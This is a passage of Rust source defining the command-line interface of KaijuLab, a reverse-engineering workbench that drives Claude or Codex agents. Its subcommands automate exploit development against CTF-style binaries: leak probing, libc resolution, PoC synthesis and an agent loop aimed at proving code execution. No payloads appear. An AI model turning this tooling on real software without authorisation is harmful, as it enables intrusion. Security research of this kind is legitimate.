mod agent_bridge;
pub mod arch;
pub mod core;
pub mod decompiler;
pub mod dwarf;
pub mod hashdb;
mod ipc;
mod mcp;
pub mod plugin;
pub mod project;
mod server;
mod tools;

use std::{
    io::{Read, Write},
    path::{Path, PathBuf},
    process::{Command, Stdio},
    sync::mpsc,
    time::{Duration, Instant},
};

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use futures_util::{SinkExt, StreamExt};
use object::{Object, ObjectSection};
use sha2::{Digest, Sha256};
use tokio::io::AsyncReadExt;
use tokio_tungstenite::tungstenite::Message as WsMessage;

use core::workspace::{socket_path_for, Workspace, WorkspaceRegistry, WritePolicy};

#[derive(Parser)]
#[command(
    name = "kaijulab",
    about = "KaijuLab — local reverse-engineering workbench driven by your own Claude Code / Codex via MCP",
    version
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Run the local web workbench daemon.  Opens a browser-driven RE
    /// workspace and exposes a Unix socket for the `mcp` shim.  If no FILE
    /// is given the daemon comes up empty — open a binary from the browser
    /// via the path picker or drag-drop.
    Serve {
        /// Binary to auto-open on startup (optional).
        #[arg(value_name = "FILE")]
        file: Option<PathBuf>,

        /// Address to bind.  Default: 127.0.0.1:7878.  Use `0.0.0.0` only
        /// alongside `--token` for remote access.
        #[arg(long, default_value = "127.0.0.1:7878")]
        bind: String,

        /// Bearer token required by all API calls and WebSocket upgrades when
        /// bound to a non-loopback interface.
        #[arg(long)]
        token: Option<String>,

        /// Enable the `patch_bytes` MCP tool.
        #[arg(long)]
        allow_patch: bool,

        /// Enable the `run_binary` MCP tool.
        #[arg(long)]
        allow_exec: bool,
    },

    /// Run an MCP stdio shim that attaches to a running `serve` daemon for
    /// the same binary, or runs standalone if none is found.
    Mcp {
        /// Binary identifying the workspace. If omitted, attach to the active
        /// workspace most recently opened by the web daemon.
        #[arg(value_name = "FILE")]
        file: Option<PathBuf>,
    },

    /// One-shot analysis: load the binary, emit a JSON summary to stdout,
    /// and exit.
    Analyze {
        /// Binary to analyse.
        #[arg(value_name = "FILE")]
        file: PathBuf,
    },

    /// Run a Rhai plugin script and exit.  Pass an absolute path to a `.rhai`
    /// file, or just the name of a plugin found in `~/.kaiju/plugins/`.
    Plugin {
        /// Plugin name or path.
        #[arg(value_name = "PLUGIN")]
        name: String,

        /// Binary path the plugin operates on.
        #[arg(value_name = "FILE")]
        file: Option<PathBuf>,
    },

    /// Install local hooks/config snippets for external tools.
    Hook {
        #[command(subcommand)]
        command: HookCommands,
    },

    /// Script the running web daemon over its REST API.
    Api {
        /// Base URL of `kaijulab serve`.
        #[arg(long, default_value = "http://127.0.0.1:7878")]
        base_url: String,

        /// Bearer token. Defaults to KAIJULAB_API_TOKEN when set.
        #[arg(long)]
        token: Option<String>,

        #[command(subcommand)]
        command: ApiCommands,
    },
}

#[derive(Subcommand)]
enum HookCommands {
    /// Create or update .mcp.json in the current directory for Claude/Codex.
    Setup {
        /// Output path. Defaults to ./.mcp.json.
        #[arg(long, default_value = ".mcp.json")]
        output: PathBuf,

        /// Command path to write. Defaults to this kaijulab executable.
        #[arg(long)]
        command: Option<PathBuf>,
    },
}

#[derive(Subcommand)]
enum ApiCommands {
    /// Raw GET against an /api path, e.g. /api/functions?json=true.
    Get {
        #[arg(value_name = "PATH")]
        path: String,
    },

    /// Raw POST with optional JSON body. Prefix body with @ to read a file.
    Post {
        #[arg(value_name = "PATH")]
        path: String,

        #[arg(long)]
        data: Option<String>,
    },

    /// Raw PATCH with optional JSON body. Prefix body with @ to read a file.
    Patch {
        #[arg(value_name = "PATH")]
        path: String,

        #[arg(long)]
        data: Option<String>,
    },

    /// Raw DELETE against an /api path.
    Delete {
        #[arg(value_name = "PATH")]
        path: String,
    },

    /// Open a binary in the daemon and make it active.
    Open {
        #[arg(value_name = "FILE")]
        file: PathBuf,
    },

    /// Run one deterministic playbook and print the full JSON result.
    RunPlaybook {
        #[arg(value_name = "ID")]
        id: String,

        #[arg(long, default_value_t = 120)]
        max_functions: u32,

        #[arg(long)]
        no_create_findings: bool,
    },

    /// Ask the local Claude/Codex bridge to work on one function.
    AgentRun {
        #[arg(value_name = "AGENT")]
        agent: String,

        #[arg(long, default_value = "triage")]
        kind: String,

        #[arg(long)]
        vaddr: String,

        #[arg(long, default_value = "suggest")]
        write_policy: String,
    },

    /// Attach to the daemon-owned Claude/Codex PTY Agent Console.
    Console {
        #[arg(value_name = "AGENT")]
        agent: String,

        /// Send this prompt once after attaching, then keep streaming output.
        #[arg(long)]
        prompt: Option<String>,

        /// Send trailing Enter after --prompt.
        #[arg(long, default_value_t = true)]
        enter: bool,

        /// Exit after this many seconds without new output. Requires --prompt.
        #[arg(long)]
        idle_timeout_secs: Option<u64>,

        /// Hard cap for prompt mode, independent of terminal spinner output.
        #[arg(long)]
        timeout_secs: Option<u64>,

        /// Delay before sending --prompt so newly spawned terminal UIs can finish booting.
        #[arg(long, default_value_t = 800)]
        input_delay_ms: u64,

        /// Send Ctrl-C before exiting after idle timeout.
        #[arg(long)]
        interrupt_on_idle: bool,

        /// Initial terminal columns reported to the daemon PTY.
        #[arg(long, default_value_t = 120)]
        cols: u16,

        /// Initial terminal rows reported to the daemon PTY.
        #[arg(long, default_value_t = 32)]
        rows: u16,
    },

    /// Poll one async job until it reaches a terminal status.
    WaitJob {
        #[arg(value_name = "JOB_ID")]
        id: String,

        #[arg(long, default_value_t = 120)]
        timeout_secs: u64,

        #[arg(long, default_value_t = 500)]
        interval_ms: u64,
    },

    /// Build an exploit-workbench context bundle for the active binary.
    ExploitContext {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum matches per gadget pattern.
        #[arg(long, default_value_t = 8)]
        max_gadgets: usize,
    },

    /// Emit an inferred exploit strategy profile from binary features.
    ExploitRecipe {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Emit compact exploit-facing binary facts from normalized KaijuLab APIs.
    BinaryFacts {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum functions/prompts to include.
        #[arg(long, default_value_t = 40)]
        max: usize,
    },

    /// Emit a stdlib Python PoC scaffold with qemu/sysroot/menu helpers.
    ExploitScaffold {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Write scaffold to this path. If omitted, only JSON text is emitted.
        #[arg(long)]
        output: Option<PathBuf>,

        /// qemu -L sysroot baked into the default, still overridable by env.
        #[arg(long)]
        sysroot: Option<PathBuf>,
    },

    /// Run a structured menu/input transcript under the target with hard caps.
    ExploitInteract {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// JSON action list or @path. Actions: send_choice, send_line, send_text, send_hex, sleep_ms, expect.
        #[arg(long)]
        actions: String,

        /// Expected substring in stdout/stderr. Can be repeated.
        #[arg(long = "expect")]
        expects: Vec<String>,

        /// qemu -L sysroot when using qemu-user.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Wall-clock timeout.
        #[arg(long, default_value_t = 10)]
        timeout_secs: u64,

        /// Append interaction output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,
    },

    /// Drive a target interactively with stepwise recv/send actions.
    ExploitDrive {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// JSON action list or @path. Supports recv_until, sendline_after, send_after, send_line, send_text, send_hex, read_for_ms.
        #[arg(long)]
        actions: String,

        /// Expected substring in the collected transcript. Can be repeated.
        #[arg(long = "expect")]
        expects: Vec<String>,

        /// Override runner, otherwise inferred from the ELF architecture.
        #[arg(long)]
        runner: Option<String>,

        /// qemu -L sysroot when using qemu-user.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Whole-session wall-clock timeout.
        #[arg(long, default_value_t = 15)]
        timeout_secs: u64,

        /// Default per recv/send-after wait timeout.
        #[arg(long, default_value_t = 1500)]
        step_timeout_ms: u64,

        /// Maximum transcript bytes retained.
        #[arg(long, default_value_t = 262144)]
        max_output: usize,

        /// Append driver output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,
    },

    /// Drive repeated leak cycles and harvest maps/pointer candidates.
    LeakProbe {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Optional JSON setup action list or @path, run before cycles.
        #[arg(long)]
        setup: Option<String>,

        /// JSON action list or @path repeated for leak attempts.
        #[arg(long)]
        cycle: String,

        /// Required transcript substring. Can be repeated.
        #[arg(long = "contains")]
        contains: Vec<String>,

        /// Leak class to require: maps, pointer, libc, heap, stack, binary. Can be repeated.
        #[arg(long = "want")]
        want: Vec<String>,

        /// Override runner, otherwise inferred from the ELF architecture.
        #[arg(long)]
        runner: Option<String>,

        /// qemu -L sysroot when using qemu-user.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Whole-session wall-clock timeout.
        #[arg(long, default_value_t = 20)]
        timeout_secs: u64,

        /// Default per recv/send-after wait timeout.
        #[arg(long, default_value_t = 1500)]
        step_timeout_ms: u64,

        /// Number of leak cycles to run.
        #[arg(long, default_value_t = 6)]
        max_rounds: u32,

        /// Maximum transcript bytes retained.
        #[arg(long, default_value_t = 524288)]
        max_output: usize,

        /// Append leak output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,
    },

    /// Model heap/menu lifecycle events and report generic primitive signals.
    HeapModel {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// JSON event list or @path. Events use op alloc/free/edit/show/realloc with id/index/size.
        #[arg(long)]
        events: String,
    },

    /// Resolve libc/base arithmetic from leaks, mappings, and adjacent libc symbols.
    LibcResolve {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Leaked address, e.g. 0xf7e12345.
        #[arg(long)]
        leak: Option<String>,

        /// Symbol represented by --leak, e.g. puts, system, __libc_start_main.
        #[arg(long)]
        symbol: Option<String>,

        /// Known libc base, if already derived.
        #[arg(long)]
        base: Option<String>,

        /// Explicit libc/shared-object path. Defaults to adjacent libc-like .so.
        #[arg(long)]
        libc: Option<PathBuf>,

        /// Target symbol to compute. Can be repeated. Defaults to common exploitation symbols.
        #[arg(long = "target")]
        targets: Vec<String>,
    },

    /// Rank generic exploit chains from proven primitives and target protections.
    ExploitPlan {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Proven primitive, e.g. libc-leak, heap-leak, arbitrary-write, uaf, double-free, overflow. Can be repeated.
        #[arg(long = "primitive")]
        primitives: Vec<String>,

        /// Known libc base, if available.
        #[arg(long)]
        libc_base: Option<String>,

        /// Known heap base, if available.
        #[arg(long)]
        heap_base: Option<String>,
    },

    /// Analyze a failed PoC/verify result and emit concrete next repair steps.
    PocRepair {
        #[arg(value_name = "SCRIPT")]
        script: PathBuf,

        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Existing exploit-verify JSON or @path. If omitted, this command runs exploit-verify.
        #[arg(long)]
        verify: Option<String>,

        /// qemu -L sysroot exposed to the PoC when verification is run.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Verification timeout when --verify is omitted.
        #[arg(long, default_value_t = 20)]
        timeout_secs: u64,

        /// Expected target exit code when --verify is omitted.
        #[arg(long)]
        expect_target_exit: Option<i32>,

        /// Expected output marker when --verify is omitted.
        #[arg(long)]
        expect_output: Option<String>,
    },

    /// Emit a generic PoC skeleton for a selected exploit chain.
    PocSynthesize {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Chain family: ret2libc, arbitrary-write, uaf-fnptr, heap-hook, unlink, leak-stage.
        #[arg(long)]
        chain: String,

        /// Proven primitive. Can be repeated.
        #[arg(long = "primitive")]
        primitives: Vec<String>,

        /// Optional crash/control offset.
        #[arg(long)]
        offset: Option<usize>,

        /// Known libc base.
        #[arg(long)]
        libc_base: Option<String>,

        /// Known heap base.
        #[arg(long)]
        heap_base: Option<String>,

        /// qemu -L sysroot baked into defaults.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Write skeleton to this path. If omitted, only JSON text is emitted.
        #[arg(long)]
        output: Option<PathBuf>,
    },

    /// Plan payloads for constrained numeric writes such as sorted-word input.
    ConstraintPlan {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Constraint mode: sorted-ascending, sorted-descending, avoid-null, preserve-canary.
        #[arg(long, default_value = "sorted-ascending")]
        mode: String,

        /// Value to place. Can be repeated.
        #[arg(long = "value")]
        values: Vec<String>,

        /// Word width in bytes.
        #[arg(long, default_value_t = 4)]
        width: usize,

        /// Optional filler count to prepend.
        #[arg(long, default_value_t = 0)]
        prefix_words: usize,

        /// Optional canary/reserved value that must stay in place.
        #[arg(long)]
        preserve: Option<String>,
    },

    /// Run or prepare exploit-loop work over a target list with consistent prompts.
    ExploitBatchLoop {
        /// Agent mode: prompt-pack, claude, or codex. claude/codex use interactive Agent Console.
        #[arg(value_name = "AGENT")]
        agent: String,

        /// JSON/string file list or @path. If omitted, uses the historical PwnableTW challenge set when present.
        #[arg(long)]
        files: Option<String>,

        /// Directory for generated PoCs.
        #[arg(long, default_value = "/tmp/kaijulab-batch")]
        output_dir: PathBuf,

        /// Per-target exploit-loop attempts.
        #[arg(long, default_value_t = 3)]
        attempts: u32,

        /// qemu -L sysroot for all targets where applicable.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Agent console hard timeout per target.
        #[arg(long, default_value_t = 360)]
        timeout_secs: u64,

        /// Console idle timeout per target.
        #[arg(long, default_value_t = 45)]
        idle_timeout_secs: u64,
    },

    /// Generate and verify offline exploit candidates without invoking an LLM.
    AutoPwn {
        /// JSON/string file list or @path. If omitted, uses the bundled PwnableTW benchmark set.
        #[arg(long)]
        files: Option<String>,

        /// Directory for generated PoCs and reports.
        #[arg(long, default_value = "/tmp/kaijulab-autopwn")]
        output_dir: PathBuf,

        /// qemu -L sysroot override for all targets where applicable.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Per-candidate verification timeout.
        #[arg(long, default_value_t = 30)]
        timeout_secs: u64,

        /// Only write candidates/reports; skip verification.
        #[arg(long)]
        no_verify: bool,
    },

    /// Emit generic heap/menu primitive probes to try next.
    HeapProbePlan {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Execute a candidate PoC script and evaluate simple success predicates.
    ExploitVerify {
        #[arg(value_name = "SCRIPT")]
        script: PathBuf,

        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Script wall-clock timeout.
        #[arg(long, default_value_t = 30)]
        timeout_secs: u64,

        /// Expected process exit code.
        #[arg(long)]
        expect_exit: Option<i32>,

        /// Expected target exit code printed by the PoC as returncode=<N>.
        #[arg(long)]
        expect_target_exit: Option<i32>,

        /// Expected substring in stdout or stderr.
        #[arg(long)]
        expect_output: Option<String>,

        /// Append verifier output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// qemu -L sysroot exposed to the PoC as KAIJU_SYSROOT.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,

        /// Arguments passed to the script after `--`.
        #[arg(last = true)]
        args: Vec<String>,
    },

    /// Send a bounded exploit-development loop prompt into Agent Console.
    ExploitLoop {
        #[arg(value_name = "AGENT")]
        agent: String,

        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Candidate PoC path the agent should create.
        #[arg(long, default_value = "/tmp/kaijulab-poc.py")]
        output: PathBuf,

        /// Goal for the generated PoC.
        #[arg(
            long,
            default_value = "Create a Python stdlib PoC and prove local code execution with exit(42) or command output."
        )]
        goal: String,

        /// Maximum analysis/fix attempts the prompt should spend.
        #[arg(long, default_value_t = 3)]
        attempts: u32,

        /// qemu -L sysroot for runtime/debug/verification commands.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Agent console hard timeout.
        #[arg(long, default_value_t = 300)]
        timeout_secs: u64,

        /// Console idle timeout.
        #[arg(long, default_value_t = 30)]
        idle_timeout_secs: u64,
    },

    /// Run the target with captured stdin/stdout/stderr and runtime diagnostics.
    RuntimeRun {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Arguments passed to the target.
        #[arg(long = "arg")]
        args: Vec<String>,

        /// Environment entries as KEY=VALUE.
        #[arg(long = "env")]
        envs: Vec<String>,

        /// Stdin text to feed, or @path to read bytes from a file.
        #[arg(long)]
        stdin: Option<String>,

        /// Working directory.
        #[arg(long)]
        cwd: Option<PathBuf>,

        /// Force a runner command, e.g. qemu-i386.
        #[arg(long)]
        runner: Option<String>,

        /// qemu -L sysroot when using qemu-user.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Wall-clock timeout.
        #[arg(long, default_value_t = 10)]
        timeout_secs: u64,

        /// Append runtime output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,
    },

    /// Run a non-interactive gdb probe and return registers/backtrace/disassembly.
    DebugProbe {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Arguments passed to the target inside gdb.
        #[arg(long = "arg")]
        args: Vec<String>,

        /// Stdin text to feed, or @path to read bytes from a file.
        #[arg(long)]
        stdin: Option<String>,

        /// qemu -L sysroot when remote-debugging a foreign-architecture target.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// Breakpoint address or symbol. Can be repeated.
        #[arg(long = "break")]
        breakpoints: Vec<String>,

        /// Continue after hitting breakpoints instead of stopping at first hit.
        #[arg(long)]
        continue_after_break: bool,

        /// GDB wall-clock timeout.
        #[arg(long, default_value_t = 20)]
        timeout_secs: u64,

        /// Append debug output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,
    },

    /// Emit exploit helper data: checksec, PLT/GOT, gadgets, cyclic patterns.
    ExploitKit {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Generate a cyclic pattern of this length.
        #[arg(long)]
        cyclic_len: Option<usize>,

        /// Find a little-endian integer/hex/text value inside the cyclic pattern.
        #[arg(long)]
        cyclic_find: Option<String>,

        /// Pattern length used by --cyclic-find.
        #[arg(long, default_value_t = 8192)]
        cyclic_search_len: usize,

        /// Maximum matches per gadget pattern.
        #[arg(long, default_value_t = 16)]
        max_gadgets: usize,
    },

    /// Query structured static-analysis data for agent workflows.
    IrQuery {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Function virtual address to inspect.
        #[arg(long)]
        function: Option<String>,

        /// Search term for function names/decompile/strings.
        #[arg(long)]
        search: Option<String>,

        /// Maximum functions/strings to include.
        #[arg(long, default_value_t = 80)]
        max: usize,
    },

    /// Emit recovery-backed decompile context for one function.
    DecompileEnhanced {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Function virtual address to inspect.
        #[arg(value_name = "VADDR")]
        vaddr: String,
    },

    /// Emit structured decompiler analysis facts for one function.
    DecompileAnalysis {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Function virtual address to inspect.
        #[arg(value_name = "VADDR")]
        vaddr: String,
    },

    /// Send a decompiler-focused analysis loop prompt into Agent Console.
    AgentDecompileLoop {
        #[arg(value_name = "AGENT")]
        agent: String,

        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Function virtual address to inspect.
        #[arg(long)]
        function: String,

        /// Analysis goal for the selected function.
        #[arg(
            long,
            default_value = "Explain this function, identify risky semantics, and propose verified next steps."
        )]
        goal: String,

        /// Maximum inspect/hypothesize/verify attempts the prompt should spend.
        #[arg(long, default_value_t = 3)]
        attempts: u32,

        /// Maximum functions used for decompiler quality context.
        #[arg(long, default_value_t = 200)]
        max_functions: usize,

        /// Agent console hard timeout.
        #[arg(long, default_value_t = 300)]
        timeout_secs: u64,

        /// Console idle timeout.
        #[arg(long, default_value_t = 30)]
        idle_timeout_secs: u64,
    },

    /// Score decompiler quality for one binary or corpus.
    DecompilerBenchmark {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Corpus root. Used when --file is omitted.
        #[arg(long, default_value = "samples")]
        root: PathBuf,

        /// Maximum binaries to inspect in corpus mode.
        #[arg(long, default_value_t = 16)]
        max_files: usize,

        /// Maximum functions per binary.
        #[arg(long, default_value_t = 200)]
        max_functions: usize,

        /// Optional path to write the JSON artifact.
        #[arg(long)]
        output: Option<PathBuf>,
    },

    /// Build a stateful analysis-loop bundle for agents or automation.
    AnalysisLoop {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Current hypothesis or task goal.
        #[arg(long, default_value = "Develop and verify a local exploit PoC.")]
        goal: String,

        /// Last observation from a failed run/debug probe.
        #[arg(long)]
        observation: Option<String>,

        /// Candidate PoC path, if any.
        #[arg(long)]
        candidate: Option<PathBuf>,

        /// Maximum matches per gadget pattern.
        #[arg(long, default_value_t = 8)]
        max_gadgets: usize,
    },

    /// Emit production-workstation capability status across the seven roadmap areas.
    WorkstationStatus {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Build a normalized binary index for agents, UI panes, and benchmarks.
    IndexBuild {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum functions to include.
        #[arg(long, default_value_t = 120)]
        max_functions: usize,

        /// Maximum strings to include.
        #[arg(long, default_value_t = 120)]
        max_strings: usize,

        /// Optional path to write the JSON artifact.
        #[arg(long)]
        output: Option<PathBuf>,
    },

    /// Build the derived program knowledge graph from index/project/evidence facts.
    KnowledgeGraph {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum functions to include.
        #[arg(long, default_value_t = 300)]
        max_functions: usize,

        /// Maximum evidence records to link.
        #[arg(long, default_value_t = 200)]
        max_evidence: usize,

        /// Optional path to write the JSON artifact.
        #[arg(long)]
        output: Option<PathBuf>,
    },

    /// Emit the ranked function triage queue from the knowledge graph.
    TriageQueue {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum queue items to return.
        #[arg(long, default_value_t = 50)]
        limit: usize,
    },

    /// Run professional recursive function/CFG/xref recovery.
    RecoveryIndex {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum functions to recover.
        #[arg(long, default_value_t = 1000)]
        max_functions: usize,

        /// Optional path to write the JSON artifact.
        #[arg(long)]
        output: Option<PathBuf>,
    },

    /// Rebuild and persist recovery facts into the project SQLite DB.
    RecoveryRebuild {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum functions to recover.
        #[arg(long, default_value_t = 1000)]
        max_functions: usize,
    },

    /// Load persisted recovery facts, rebuilding when missing.
    RecoveryStored {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Maximum functions if rebuild is needed.
        #[arg(long, default_value_t = 1000)]
        max_functions: usize,
    },

    /// Record an analyst correction for recovered code/data/function facts.
    RecoveryCorrect {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Correction action: rename_function, mark_code, mark_data, split_function, merge_function.
        #[arg(long)]
        action: String,

        /// Address being corrected.
        #[arg(long)]
        vaddr: String,

        /// Target address for merge_function.
        #[arg(long)]
        target: Option<String>,

        /// Human note or fallback name for rename_function.
        #[arg(long)]
        note: Option<String>,

        /// Optional JSON data object.
        #[arg(long)]
        data: Option<String>,
    },

    /// Query graph-backed code xrefs to an address.
    RecoveryXrefs {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Target virtual address.
        #[arg(value_name = "VADDR")]
        vaddr: String,

        /// Maximum functions to recover before querying.
        #[arg(long, default_value_t = 1000)]
        max_functions: usize,
    },

    /// Query recovered CFG for a function start address.
    RecoveryCfg {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Function start virtual address.
        #[arg(value_name = "VADDR")]
        vaddr: String,

        /// Maximum functions to recover before querying.
        #[arg(long, default_value_t = 1000)]
        max_functions: usize,
    },

    /// Diagnose qemu/gdb/container/sysroot readiness.
    SysrootDoctor {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Emit the exploit-automation stack manifest.
    ExploitStack {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Emit a resumable agent-job plan with phases, artifacts, and stop criteria.
    AgentJobPlan {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Job goal.
        #[arg(
            long,
            default_value = "Analyze the target and produce verified artifacts."
        )]
        goal: String,
    },

    /// Emit the dense workbench UI contract.
    WorkbenchManifest,

    /// Inventory a benchmark corpus and expected grading artifacts.
    BenchmarkPlan {
        /// Corpus root.
        #[arg(long, default_value = "samples")]
        root: PathBuf,

        /// Maximum candidate binaries to inspect.
        #[arg(long, default_value_t = 64)]
        max_files: usize,
    },

    /// List immutable runtime/debug/verification evidence records for a target.
    EvidenceList {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Filter by evidence kind, e.g. runtime_run, debug_probe, exploit_verify.
        #[arg(long)]
        kind: Option<String>,

        /// Maximum records to return.
        #[arg(long, default_value_t = 50)]
        limit: usize,
    },

    /// Emit reusable execution profiles for the target.
    ExecutionProfiles {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Emit the planned persistent debugger session contract for the target.
    DebugSessionContract {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Emit smoke-test checks for benchmark regression harnesses.
    BenchmarkSmoke {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,
    },

    /// Execute a bounded smoke benchmark corpus and print structured results.
    BenchmarkRun {
        /// Corpus root or single binary.
        #[arg(long, default_value = "samples")]
        root: PathBuf,

        /// Maximum candidate binaries to execute.
        #[arg(long, default_value_t = 8)]
        max_files: usize,

        /// Per-target runtime/debug timeout.
        #[arg(long, default_value_t = 6)]
        timeout_secs: u64,

        /// Optional path to write the JSON artifact.
        #[arg(long)]
        output: Option<PathBuf>,

        /// Append runtime/debug observations to each target evidence log.
        #[arg(long)]
        save_evidence: bool,
    },

    /// Feed a cyclic pattern under gdb and report candidate crash offsets.
    CrashOffset {
        /// Override the active daemon binary path.
        #[arg(long)]
        file: Option<PathBuf>,

        /// Pattern length to feed on stdin.
        #[arg(long, default_value_t = 4096)]
        pattern_len: usize,

        /// Arguments passed to the target inside gdb.
        #[arg(long = "arg")]
        args: Vec<String>,

        /// qemu -L sysroot when remote-debugging a foreign target.
        #[arg(long)]
        sysroot: Option<PathBuf>,

        /// GDB wall-clock timeout.
        #[arg(long, default_value_t = 12)]
        timeout_secs: u64,

        /// Append crash-offset output to the target evidence log.
        #[arg(long)]
        save_evidence: bool,

        /// Evidence tag. Can be repeated.
        #[arg(long = "tag")]
        tags: Vec<String>,
    },

    /// Start a daemon-owned live debugger session for the active target.
    DebugSessionStart {
        /// Arguments passed to the debug target.
        #[arg(long = "arg")]
        args: Vec<String>,

        /// qemu -L sysroot for foreign dynamic targets.
        #[arg(long)]
        sysroot: Option<PathBuf>,
    },

    /// List daemon-owned live debugger sessions.
    DebugSessionList,

    /// Show one live debugger session.
    DebugSessionGet {
        #[arg(value_name = "SESSION_ID")]
        id: String,
    },

    /// Run one action against a live debugger session.
    DebugSessionAction {
        #[arg(value_name = "SESSION_ID")]
        id: String,

        /// Action: break, continue, stepi, registers, backtrace, disassemble_pc, memory, snapshot, raw.
        #[arg(value_name = "ACTION")]
        action: String,

        /// Address for break/memory.
        #[arg(long)]
        address: Option<String>,

        /// Length for memory/disassemble_pc.
        #[arg(long)]
        length: Option<usize>,

        /// Raw gdb command when ACTION=raw.
        #[arg(long)]
        command: Option<String>,
    },

    /// Stop one live debugger session.
    DebugSessionStop {
        #[arg(value_name = "SESSION_ID")]
        id: String,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    init_tracing();
    let cli = Cli::parse();
    match cli.command {
        Commands::Serve {
            file,
            bind,
            token,
            allow_patch,
            allow_exec,
        } => run_serve(file, bind, token, allow_patch, allow_exec).await,
        Commands::Mcp { file } => run_mcp(file).await,
        Commands::Analyze { file } => run_analyze(file).await,
        Commands::Plugin { name, file } => run_plugin(name, file),
        Commands::Hook { command } => run_hook(command),
        Commands::Api {
            base_url,
            token,
            command,
        } => run_api(base_url, token, command).await,
    }
}

fn init_tracing() {
    use tracing_subscriber::{fmt, EnvFilter};
    let filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));
    let _ = fmt().with_env_filter(filter).with_target(false).try_init();
}

async fn run_serve(
    file: Option<PathBuf>,
    bind: String,
    token: Option<String>,
    allow_patch: bool,
    allow_exec: bool,
) -> Result<()> {
    let policy = WritePolicy {
        allow_patch,
        allow_exec,
    };
    let bus = core::EventBus::new(1024);
    let registry = WorkspaceRegistry::new(bus.clone(), policy);

    if let Some(path) = file {
        match registry.open(&path) {
